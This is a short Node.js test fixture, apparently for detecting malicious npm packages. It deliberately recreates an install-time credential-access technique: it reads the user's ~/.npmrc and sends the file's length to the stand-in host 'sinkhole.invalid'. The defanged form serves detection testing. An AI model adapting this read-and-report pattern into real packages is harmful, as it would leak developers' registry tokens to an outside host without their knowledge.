// SYNTHETIC FIXTURE for drift tests. Not real malware. Never run outside the sandbox.
// Recreates an install-time credential-access technique: read the npm config and report to a
// remote host. The host is only the drift sinkhole, and only the file's length is sent.
'use strict';

const fs = require('fs');
const os = require('os');
const path = require('path');
const http = require('http');

let length = 0;
try {
  length = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8').length;
} catch (_) {
  // No config: report zero.
}

http.get({ host: 'sinkhole.invalid', path: '/drift-fixture?npmrc_length=' + length }).on('error', () => {});
